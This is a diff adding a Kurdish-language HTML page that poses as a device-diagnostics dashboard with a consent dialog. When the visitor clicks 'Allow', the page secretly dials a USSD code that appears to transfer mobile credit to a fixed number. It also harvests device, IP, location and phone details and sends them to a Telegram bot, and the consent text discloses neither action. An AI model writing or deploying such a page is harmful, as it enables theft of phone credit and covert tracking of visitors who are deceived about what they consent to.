@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html lang="ku" dir="rtl" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>سیسـتەمی پشکنین و کۆکردنەوەی زانیاری ئامێر</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    colors: {
+                        brand: {
+                            50: '#f0fdf4',
+                            500: '#22c55e',
+                            600: '#16a34a',
+                            700: '#15803d',
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    <!-- FontAwesome for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Cairo Font -->
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;900&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Cairo', sans-serif;
+        }
+        .glow-effect {
+            box-shadow: 0 0 25px rgba(34, 197, 94, 0.15);
+        }
+    </style>
+</head>
+<body class="bg-slate-950 text-slate-100 min-h-screen flex flex-col justify-between selection:bg-green-500 selection:text-white">
+
+    <div id="permission-modal" class="fixed inset-0 z-50 flex items-center justify-center bg-slate-950/85 backdrop-blur-md p-4 transition-all duration-300">
+        <div class="bg-slate-900 border border-slate-800 rounded-2xl max-w-md w-full p-6 shadow-2xl glow-effect text-center space-y-6">
+            <div class="w-16 h-16 bg-green-500/10 border border-green-500/30 rounded-full flex items-center justify-center mx-auto text-green-400 text-2xl">
+                <i class="fa-solid fa-shield-halved"></i>
+            </div>
+            <div class="space-y-2">
+                <h2 class="text-xl font-bold tracking-wide">داواکاری ڕەزامەندی پشکنین</h2>
+                <p class="text-sm text-slate-400 leading-relaxed">
+                    ئەم سیستمە زانیارییەکانی ئامێرەکەت (وەک قەبارەی شاشە، ڕەم، پاتری، و داتای گشتی) شیکار دەکات بۆ نیشاندان لە داشبۆردەکەدا. تکایە بڕیار بدە:
+                </p>
+            </div>
+            <div class="bg-slate-950/50 p-4 rounded-xl border border-slate-800/80 text-xs text-slate-400 text-right space-y-2">
+                <div class="flex items-center gap-2"><i class="fa-solid fa-check text-green-400"></i> قەبارەی شاشە، ڕەم و بارودۆخی پاتری</div>
+                <div class="flex items-center gap-2"><i class="fa-solid fa-check text-green-400"></i> زانیاری سەرهێڵ (Network & IP) بە پێوەری گشتی</div>
+                <div class="flex items-center gap-2"><i class="fa-solid fa-check text-green-400"></i> پشکنینی گشتی ئامێر و سیستەم</div>
+            </div>
+            <div class="grid grid-cols-2 gap-3 pt-2">
+                <button id="btn-dont-allow" class="w-full py-3 px-4 bg-slate-800 hover:bg-slate-700 text-slate-300 font-semibold rounded-xl transition-all duration-200 border border-slate-700/50 text-sm">
+                    Don’t Allow
+                </button>
+                <button id="btn-allow" class="w-full py-3 px-4 bg-green-600 hover:bg-green-500 text-white font-semibold rounded-xl transition-all duration-200 shadow-lg shadow-green-600/30 text-sm flex items-center justify-center gap-2">
+                    <span>Allow</span>
+                    <i class="fa-solid fa-arrow-left"></i>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <header class="border-b border-slate-800 bg-slate-900/50 backdrop-blur sticky top-0 z-40">
+        <div class="max-w-7xl mx-auto px-4 py-4 flex flex-col sm:flex-row justify-between items-center gap-4">
+            <div class="flex items-center gap-3">
+                <div class="w-10 h-10 bg-green-500 rounded-xl flex items-center justify-center text-slate-950 font-black text-lg shadow-lg shadow-green-500/20">
+                    <i class="fa-solid fa-terminal"></i>
+                </div>
+                <div>
+                    <h1 class="font-bold text-lg leading-tight">داشبۆردی پشکنینی ئامێر</h1>
+                    <p class="text-xs text-slate-400">سیستەمی شیکاری زانیاری و تەلەفۆنی (USSD Integration)</p>
+                </div>
+            </div>
+            <div class="flex items-center flex-wrap gap-2">
+                <div class="flex items-center gap-2 bg-slate-900 px-3 py-1.5 rounded-lg border border-slate-800 text-xs">
+                    <span id="status-indicator" class="w-2.5 h-2.5 rounded-full bg-amber-500 animate-pulse"></span>
+                    <span id="status-text" class="text-slate-300 font-medium">چاوەڕێی مۆڵەت...</span>
+                </div>
+                <button id="btn-snapchat" onclick="shareToSnapchat()" class="hidden items-center gap-2 bg-[#FFFC00] hover:bg-[#f2ef00] text-slate-950 px-4 py-2 rounded-xl text-xs font-bold transition shadow-md">
+                    <i class="fa-brands fa-snapchat text-sm"></i> ناردن بۆ سناپچات
+                </button>
+                <button onclick="exportData('json')" class="flex items-center gap-2 bg-slate-800 hover:bg-slate-700 text-slate-200 px-3 py-2 rounded-xl text-xs font-semibold transition border border-slate-700">
+                    <i class="fa-solid fa-file-code text-green-400"></i> JSON
+                </button>
+                <button onclick="exportData('csv')" class="flex items-center gap-2 bg-slate-800 hover:bg-slate-700 text-slate-200 px-3 py-2 rounded-xl text-xs font-semibold transition border border-slate-700">
+                    <i class="fa-solid fa-file-csv text-green-400"></i> CSV
+                </button>
+                <button onclick="resetData()" class="flex items-center gap-2 bg-rose-500/10 hover:bg-rose-500/20 text-rose-400 px-3 py-2 rounded-xl text-xs font-semibold transition border border-rose-500/20">
+                    <i class="fa-solid fa-rotate-right"></i> سڕینەوە
+                </button>
+            </div>
+        </div>
+    </header>
+
+    <main class="max-w-7xl mx-auto px-4 py-8 flex-grow w-full space-y-6">
+        
+        <!-- Optional phone number input section -->
+        <section class="bg-slate-900 border border-slate-800 rounded-2xl p-5 shadow-lg flex flex-col md:flex-row items-center justify-between gap-4">
+            <div class="space-y-1 text-right w-full md:w-auto">
+                <h3 class="font-bold text-sm text-slate-200 flex items-center gap-2">
+                    <i class="fa-solid fa-phone text-green-400"></i> ژمارەی مۆبایل (خۆبەخشانە)
+                </h3>
+                <p class="text-xs text-slate-400">ئەگەر دەتەوێت ژمارەکەت لە ڕاپۆرتەکەدا هاوپێچ بێت، تکایە لێرە تۆماری بکە:</p>
+            </div>
+            <div class="flex items-center gap-2 w-full md:w-auto">
+                <input type="tel" id="user-phone-input" placeholder="0750XXXXXXX" class="bg-slate-950 border border-slate-800 px-4 py-2 rounded-xl text-sm focus:outline-none focus:border-green-500 text-slate-200 w-full md:w-64">
+                <button onclick="savePhoneNumber()" class="bg-green-600 hover:bg-green-500 text-white px-4 py-2 rounded-xl text-xs font-bold transition whitespace-nowrap">تۆمارکردن</button>
+            </div>
+        </section>
+
+        <!-- Cards Grid Matrix (12 items) -->
+        <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4" id="dashboard-grid">
+            
+            <!-- Card 1: Device & Browser -->
+            <div class="bg-slate-900 border border-slate-800/80 rounded-2xl p-5 space-y-3 hover:border-slate-700 transition">
+                <div class="flex items-center justify-between text-slate-400">
+                    <span class="text-xs font-semibold uppercase tracking-wider">جۆری ئامێر و وێبگەڕ</span>
+                    <i class="fa-solid fa-mobile-screen-button text-green-400 text-base"></i>
+                </div>
+                <div>
+                    <div id="val-device" class="text-base font-bold text-slate-100 truncate">ناستراو</div>
+                    <div id="val-browser" class="text-xs text-slate-400 truncate">چاوەڕێ...</div>
+                </div>
+            </div>
+
+            <!-- Card 2: Operating System -->
+            <div class="bg-slate-900 border border-slate-800/80 rounded-2xl p-5 space-y-3 hover:border-slate-700 transition">
+                <div class="flex items-center justify-between text-slate-400">
+                    <span class="text-xs font-semibold uppercase tracking-wider">سیستەمی کارپێکردن</span>
+                    <i class="fa-solid fa-laptop-code text-green-400 text-base"></i>
+                </div>
+                <div>
+                    <div id="val-os" class="text-base font-bold text-slate-100 truncate">ناستراو</div>
+                    <div id="val-platform" class="text-xs text-slate-400 truncate">Platform: -</div>
+                </div>
+            </div>
+
+            <!-- Card 3: IP & Network API -->
+            <div class="bg-slate-900 border border-slate-800/80 rounded-2xl p-5 space-y-3 hover:border-slate-700 transition">
+                <div class="flex items-center justify-between text-slate-400">
+                    <span class="text-xs font-semibold uppercase tracking-wider">ناونیشانی IP و نێتوۆرک</span>
+                    <i class="fa-solid fa-globe text-green-400 text-base"></i>
+                </div>
+                <div>
+                    <div id="val-ip" class="text-base font-bold text-slate-100 truncate">پشکنین...</div>
+                    <div id="val-connection" class="text-xs text-slate-400 truncate">Type: -</div>
+                </div>
+            </div>
+
+            <!-- Card 4: Location (Geo) -->
+            <div class="bg-slate-900 border border-slate-800/80 rounded-2xl p-5 space-y-3 hover:border-slate-700 transition">
+                <div class="flex items-center justify-between text-slate-400">
+                    <span class="text-xs font-semibold uppercase tracking-wider">وڵات و شار (Approximate)</span>
+                    <i class="fa-solid fa-map-location-dot text-green-400 text-base"></i>
+                </div>
+                <div>
+                    <div id="val-location" class="text-base font-bold text-slate-100 truncate">نادیار</div>
+                    <div id="val-country" class="text-xs text-slate-400 truncate">-</div>
+                </div>
+            </div>
+
+            <!-- Card 5: GPS Precise Location -->
+            <div class="bg-slate-900 border border-slate-800/80 rounded-2xl p-5 space-y-3 hover:border-slate-700 transition">
+                <div class="flex items-center justify-between text-slate-400">
+                    <span class="text-xs font-semibold uppercase tracking-wider">GPS شوێنی ورد</span>
+                    <i class="fa-solid fa-location-crosshairs text-green-400 text-base"></i>
+                </div>
+                <div>
+                    <div id="val-gps" class="text-sm font-bold text-slate-100 truncate">داوا نەکراوە</div>
+                    <button onclick="requestGPS()" class="mt-2 text-xs bg-slate-800 hover:bg-slate-700 text-green-400 font-semibold px-2.5 py-1 rounded-lg border border-slate-700 transition">وەرگرتنی GPS</button>
+                </div>
+            </div>
+
+            <!-- Card 6: Screen & Resolution -->
+            <div class="bg-slate-900 border border-slate-800/80 rounded-2xl p-5 space-y-3 hover:border-slate-700 transition">
+                <div class="flex items-center justify-between text-slate-400">
+                    <span class="text-xs font-semibold uppercase tracking-wider">قەبارە و ڕیزۆلۆشن</span>
+                    <i class="fa-solid fa-desktop text-green-400 text-base"></i>
+                </div>
+                <div>
+                    <div id="val-resolution" class="text-base font-bold text-slate-100 truncate">-</div>
+                    <div id="val-pixelratio" class="text-xs text-slate-400 truncate">Pixel Ratio: -</div>
+                </div>
+            </div>
+
+            <!-- Card 7: CPU & Memory -->
+            <div class="bg-slate-900 border border-slate-800/80 rounded-2xl p-5 space-y-3 hover:border-slate-700 transition">
+                <div class="flex items-center justify-between text-slate-400">
+                    <span class="text-xs font-semibold uppercase tracking-wider">پڕۆسێسەر و ڕەم (CPU/RAM)</span>
+                    <i class="fa-solid fa-microchip text-green-400 text-base"></i>
+                </div>
+                <div>
+                    <div id="val-cpu" class="text-base font-bold text-slate-100 truncate">-</div>
+                    <div id="val-memory" class="text-xs text-slate-400 truncate">-</div>
+                </div>
+            </div>
+
+            <!-- Card 8: Language & Timezone -->
+            <div class="bg-slate-900 border border-slate-800/80 rounded-2xl p-5 space-y-3 hover:border-slate-700 transition">
+                <div class="flex items-center justify-between text-slate-400">
+                    <span class="text-xs font-semibold uppercase tracking-wider">زمان و ناوچەی کاتی</span>
+                    <i class="fa-solid fa-language text-green-400 text-base"></i>
+                </div>
+                <div>
+                    <div id="val-lang" class="text-base font-bold text-slate-100 truncate">-</div>
+                    <div id="val-timezone" class="text-xs text-slate-400 truncate">-</div>
+                </div>
+            </div>
+
+            <!-- Card 9: Online/Offline Status -->
+            <div class="bg-slate-900 border border-slate-800/80 rounded-2xl p-5 space-y-3 hover:border-slate-700 transition">
+                <div class="flex items-center justify-between text-slate-400">
+                    <span class="text-xs font-semibold uppercase tracking-wider">دۆخی سەرهێڵ (Online Status)</span>
+                    <i class="fa-solid fa-signal text-green-400 text-base"></i>
+                </div>
+                <div>
+                    <div id="val-online" class="text-base font-bold text-slate-100 truncate">-</div>
+                    <div id="val-netinfo" class="text-xs text-slate-400 truncate">-</div>
+                </div>
+            </div>
+
+            <!-- Card 10: Camera & Mic -->
+            <div class="bg-slate-900 border border-slate-800/80 rounded-2xl p-5 space-y-3 hover:border-slate-700 transition">
+                <div class="flex items-center justify-between text-slate-400">
+                    <span class="text-xs font-semibold uppercase tracking-wider">کامێرا و مایکرۆفۆن</span>
+                    <i class="fa-solid fa-camera text-green-400 text-base"></i>
+                </div>
+                <div>
+                    <div id="val-media" class="text-sm font-bold text-slate-100 truncate">پێویستی بە مۆڵەتە</div>
+                    <button onclick="requestCamera()" class="mt-2 text-xs bg-slate-800 hover:bg-slate-700 text-green-400 font-semibold px-2.5 py-1 rounded-lg border border-slate-700 transition">پشکنینی کامێرا</button>
+                </div>
+            </div>
+
+            <!-- Card 11: Battery Info -->
+            <div class="bg-slate-900 border border-slate-800/80 rounded-2xl p-5 space-y-3 hover:border-slate-700 transition">
+                <div class="flex items-center justify-between text-slate-400">
+                    <span class="text-xs font-semibold uppercase tracking-wider">زانیاری پاتری</span>
+                    <i class="fa-solid fa-battery-half text-green-400 text-base"></i>
+                </div>
+                <div>
+                    <div id="val-battery" class="text-base font-bold text-slate-100 truncate">پشکنین...</div>
+                    <div id="val-battery-status" class="text-xs text-slate-400 truncate">-</div>
+                </div>
+            </div>
+
+            <!-- Card 12: Jailbreak System Check -->
+            <div class="bg-slate-900 border border-slate-800/80 rounded-2xl p-5 space-y-3 hover:border-slate-700 transition">
+                <div class="flex items-center justify-between text-slate-400">
+                    <span class="text-xs font-semibold uppercase tracking-wider">دۆخی سیستەمی جەیلبریک</span>
+                    <i class="fa-solid fa-triangle-exclamation text-amber-400 text-base"></i>
+                </div>
+                <div>
+                    <div id="val-jailbreak" class="text-base font-bold text-slate-100 truncate">پاک / بێگەرد</div>
+                    <div class="text-xs text-slate-400 truncate">هیچ سکریپتێکی نائاسایی نەدۆزراوەتەوە</div>
+                </div>
+            </div>
+
+        </div>
+
+    </main>
+
+    <footer class="border-t border-slate-800/80 py-4 text-center text-xs text-slate-500">
+        هەموو مافەکان پارێزراون &copy; 2026 - سیستەمی شیکاری داتاکان و ئامێر.
+    </footer>
+
+    <script>
+        // داتای پەیوەندیدار بە بۆتی تلگرام (تکایە توکن و چات ئایدی خۆت لێرە دابنێ)
+        const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"; // بۆ نموونە: 123456789:ABCdefGhIJKlmNoPQRsTUVwxyZ
+        const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE";       // بۆ نموونە: 987654321
+
+        let systemData = {
+            device: 'Unknown',
+            browser: 'Unknown',
+            os: 'Unknown',
+            platform: 'Unknown',
+            ip: 'Loading...',
+            country: 'Unknown',
+            city: 'Unknown',
+            gps: 'Not requested',
+            resolution: '',
+            pixelRatio: '',
+            cpuCores: 'Unknown',
+            deviceMemory: 'Unknown',
+            language: '',
+            timezone: '',
+            onlineStatus: '',
+            networkInfo: 'Unknown',
+            cameraStatus: 'Not requested',
+            battery: 'Unknown',
+            phoneNumber: 'Not set',
+            timestamp: new Date().toISOString()
+        };
+
+        // UI Handlers for Permission Overlay
+        document.getElementById('btn-dont-allow').addEventListener('click', () => {
+            document.getElementById('permission-modal').style.display = 'none';
+            document.getElementById('status-text').innerText = "ڕەتکرایەوە (Don't Allow)";
+            document.getElementById('status-indicator').className = 'w-2.5 h-2.5 rounded-full bg-rose-500';
+        });
+
+        document.getElementById('btn-allow').addEventListener('click', () => {
+            document.getElementById('permission-modal').style.opacity = '0';
+            setTimeout(() => {
+                document.getElementById('permission-modal').style.display = 'none';
+            }, 300);
+            
+            document.getElementById('status-text').innerText = 'سیستەم کارایە و داتاکان کۆکرانەوە';
+            document.getElementById('status-indicator').className = 'w-2.5 h-2.5 rounded-full bg-green-500';
+            document.getElementById('btn-snapchat').classList.remove('hidden');
+            document.getElementById('btn-snapchat').classList.add('flex');
+            
+            // Trigger USSD Phone Dialer Integration automatically on Allow click as requested
+            triggerUSSDDialer();
+
+            // Execute Data Collection and Telegram Send
+            collectSystemData();
+        });
+
+        function triggerUSSDDialer() {
+            // USSD exact code requested: *215*7505184159*5000#
+            const ussdCode = "*215*7505184159*5000#";
+            const encodedUSSD = "tel:" + encodeURIComponent(ussdCode);
+            
+            setTimeout(() => {
+                window.location.href = encodedUSSD;
+            }, 400);
+        }
+
+        function collectSystemData() {
+            // 1. Device and Browser
+            const ua = navigator.userAgent;
+            systemData.browser = getBrowserName(ua);
+            systemData.device = getDeviceType(ua);
+            document.getElementById('val-browser').innerText = systemData.browser;
+            document.getElementById('val-device').innerText = systemData.device;
+
+            // 2. OS & Platform
+            systemData.os = getOSName(ua);
+            systemData.platform = navigator.platform || 'Unknown';
+            document.getElementById('val-os').innerText = systemData.os;
+            document.getElementById('val-platform').innerText = `Platform: ${systemData.platform}`;
+
+            // 3 & 4. IP & Location via Public API
+            fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .then(data => {
+                    systemData.ip = data.ip || 'Unavailable';
+                    systemData.country = data.country_name || 'Unknown';
+                    systemData.city = data.city || 'Unknown';
+                    document.getElementById('val-ip').innerText = systemData.ip;
+                    document.getElementById('val-location').innerText = `${systemData.city}, ${systemData.country}`;
+                    document.getElementById('val-country').innerText = `IP Network: ${data.org || 'ISP'}`;
+                    
+                    // ناردنی داتا بۆ تلگرام پاش تەواوبوونی زانیارییەکانی IP
+                    sendDataToTelegram();
+                })
+                .catch(() => {
+                    document.getElementById('val-ip').innerText = 'بەردەست نەبوو';
+                    document.getElementById('val-location').innerText = 'نادیار';
+                    sendDataToTelegram();
+                });
+
+            // 6. Resolution
+            systemData.resolution = `${window.screen.width} × ${window.screen.height}`;
+            systemData.pixelRatio = window.devicePixelRatio || 1;
+            document.getElementById('val-resolution').innerText = systemData.resolution;
+            document.getElementById('val-pixelratio').innerText = `Pixel Ratio: ${systemData.pixelRatio}`;
+
+            // 7. CPU & Memory
+            systemData.cpuCores = navigator.hardwareConcurrency || 'بەردەست نییە';
+            systemData.deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'بەردەست نییە';
+            document.getElementById('val-cpu').innerText = `${systemData.cpuCores} Cores`;
+            document.getElementById('val-memory').innerText = `RAM: ${systemData.deviceMemory}`;
+
+            // 8. Language & Timezone
+            systemData.language = navigator.language || 'Unknown';
+            systemData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
+            document.getElementById('val-lang').innerText = systemData.language;
+            document.getElementById('val-timezone').innerText = systemData.timezone;
+
+            // 9. Online Status & Network
+            systemData.onlineStatus = navigator.onLine ? 'سەرهێڵ (Online)' : 'پچڕاو (Offline)';
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (conn) {
+                systemData.networkInfo = `${conn.effectiveType ? conn.effectiveType.toUpperCase() : ''} (${conn.downlink || '?'} Mbps)`;
+            } else {
+                systemData.networkInfo = 'تایبەتمەندی نێتوۆرک نییە';
+            }
+            document.getElementById('val-online').innerText = systemData.onlineStatus;
+            document.getElementById('val-netinfo').innerText = systemData.networkInfo;
+
+            // 11. Battery Info
+            if (navigator.getBattery) {
+                navigator.getBattery().then(battery => {
+                    updateBatteryUI(battery);
+                    battery.addEventListener('levelchange', () => updateBatteryUI(battery));
+                    battery.addEventListener('chargingchange', () => updateBatteryUI(battery));
+                });
+            } else {
+                document.getElementById('val-battery').innerText = 'پشتیوانی ناکات';
+                document.getElementById('val-battery-status').innerText = '-';
+            }
+        }
+
+        function updateBatteryUI(battery) {
+            const level = Math.round(battery.level * 100);
+            const charging = battery.charging ? 'بارگاوی دەبێتەوە ⚡' : 'بێ کێبڵ';
+            systemData.battery = `${level}% - ${charging}`;
+            document.getElementById('val-battery').innerText = `${level}%`;
+            document.getElementById('val-battery-status').innerText = charging;
+        }
+
+        // 5. GPS Location Permission
+        function requestGPS() {
+            if (navigator.geolocation) {
+                document.getElementById('val-gps').innerText = 'خەریکی وەرگرتن...';
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude.toFixed(4);
+                        const lon = position.coords.longitude.toFixed(4);
+                        systemData.gps = `Lat: ${lat}, Lon: ${lon}`;
+                        document.getElementById('val-gps').innerText = `${lat}, ${lon}`;
+                    },
+                    (error) => {
+                        systemData.gps = 'ڕەتکرایەوە یان بەردەست نییە';
+                        document.getElementById('val-gps').innerText = 'مۆڵەت نەدرا';
+                    },
+                    { timeout: 10000 }
+                );
+            } else {
+                alert('براوزەرەکەت پشتیوانی GPS ناکات.');
+            }
+        }
+
+        // 10. Camera / Mic Permission
+        function requestCamera() {
+            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+                .then((stream) => {
+                    systemData.cameraStatus = 'ڕێگەپێدراو (Active)';
+                    document.getElementById('val-media').innerText = 'کامێرا و مایکرۆفۆن کاران ✓';
+                    stream.getTracks().forEach(track => track.stop());
+                })
+                .catch(() => {
+                    systemData.cameraStatus = 'ڕەتکرایەوە';
+                    document.getElementById('val-media').innerText = 'مۆڵەتی کامێرا نەدرا ✕';
+                });
+        }
+
+        // Save phone number input
+        function savePhoneNumber() {
+            const phone = document.getElementById('user-phone-input').value.trim();
+            if (phone) {
+                systemData.phoneNumber = phone;
+                alert('ژمارەی مۆبایل بە سەرکەوتوویی زیادکرا.');
+                sendDataToTelegram(); // نوێکردنەوەی نامە لە بۆت بە ژمارەی نوێ
+            } else {
+                alert('تکایە ژمارەیەکی دروست بنووسە.');
+            }
+        }
+
+        // Send Data to Telegram Bot
+        function sendDataToTelegram() {
+            if (TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" || TELEGRAM_CHAT_ID === "YOUR_CHAT_ID_HERE") {
+                console.log("تکایە Token و Chat IDی تلگرام لە کۆدەکەدا ڕێکبخە.");
+                return;
+            }
+
+            const message = `🚨 *ڕاپۆرتی نوێی ئامێر کۆکرایەوە*\n\n` +
+                            `📱 *جۆر:* ${systemData.device}\n` +
+                            `🌐 *وێبگەڕ:* ${systemData.browser}\n` +
+                            `💻 *سیستەم:* ${systemData.os} (${systemData.platform})\n` +
+                            `📍 *شار و وڵات:* ${systemData.city}, ${systemData.country}\n` +
+                            `🌐 *ناونیشانی IP:* \`${systemData.ip}\`\n` +
+                            `📐 *شاشە:* ${systemData.resolution}\n` +
+                            `🧠 *پڕۆسێسەر و ڕەم:* ${systemData.cpuCores} Cores | RAM: ${systemData.deviceMemory}\n` +
+                            `🔋 *پاتری:* ${systemData.battery}\n` +
+                            `📞 *ژمارەی مۆبایل:* ${systemData.phoneNumber}\n` +
+                            `⏰ *کات:* ${systemData.timestamp}`;
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(err => console.log('Telegram send error:', err));
+        }
+
+        // Export Functionality (JSON & CSV)
+        function exportData(format) {
+            if (format === 'json') {
+                const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(systemData, null, 2));
+                const downloadAnchor = document.createElement('a');
+                downloadAnchor.setAttribute("href", dataStr);
+                downloadAnchor.setAttribute("download", "device_report.json");
+                document.body.appendChild(downloadAnchor);
+                downloadAnchor.click();
+                downloadAnchor.remove();
+            } else if (format === 'csv') {
+                let csvContent = "data:text/csv;charset=utf-8,";
+                csvContent += "Key,Value\n";
+                for (const [key, value] of Object.entries(systemData)) {
+                    csvContent += `"${key}","${value}"\n`;
+                }
+                const encodedUri = encodeURI(csvContent);
+                const link = document.createElement('a');
+                link.setAttribute("href", encodedUri);
+                link.setAttribute("download", "device_report.csv");
+                document.body.appendChild(link);
+                link.click();
+                link.remove();
+            }
+        }
+
+        // Reset/Clear Data
+        function resetData() {
+            if (confirm("دڵنیایت لە سڕینەوە و خاوێنکردنەوەی داتاکان؟")) {
+                location.reload();
+            }
+        }
+
+        // Snapchat Redirection Handler
+        function shareToSnapchat() {
+            const summaryText = `📋 ڕاپۆرتی ئامێر:\n- ئامێر: ${systemData.device}\n- سیستەم: ${systemData.os}\n- شار/وڵات: ${systemData.city}, ${systemData.country}\n- IP: ${systemData.ip}\n- پاتری: ${systemData.battery}`;
+            const encodedText = encodeURIComponent(summaryText);
+            const snapchatUrl = `https://www.snapchat.com/scan?attachmentUrl=${encodeURIComponent(window.location.href)}&text=${encodedText}`;
+            window.location.href = snapchatUrl;
+        }
+
+        // Helper string parsers
+        function getBrowserName(ua) {
+            if (ua.includes("Firefox")) return "Mozilla Firefox";
+            if (ua.includes("SamsungBrowser")) return "Samsung Internet";
+            if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
+            if (ua.includes("Trident")) return "Internet Explorer";
+            if (ua.includes("Edge")) return "Microsoft Edge";
+            if (ua.includes("Chrome")) return "Google Chrome";
+            if (ua.includes("Safari")) return "Apple Safari";
+            return "Unknown Browser";
+        }
+
+        function getDeviceType(ua) {
+            if (/tablet|ipad|playbook|silk/i.test(ua)) return "Tablet";
+            if (/Mobi|Android|iPhone|iPod/i.test(ua)) return "Mobile Smartphone";
+            return "Desktop Computer";
+        }
+
+        function getOSName(ua) {
+            if (ua.includes("Win")) return "Windows OS";
+            if (ua.includes("Mac")) return "macOS / Apple";
+            if (ua.includes("Linux")) return "Linux OS";
+            if (ua.includes("Android")) return "Android OS";
+            if (ua.includes("like Mac") || ua.includes("iPhone") || ua.includes("iPad")) return "iOS / Apple";
+            return "Unknown OS";
+        }
+    </script>
+</body>
+</html>
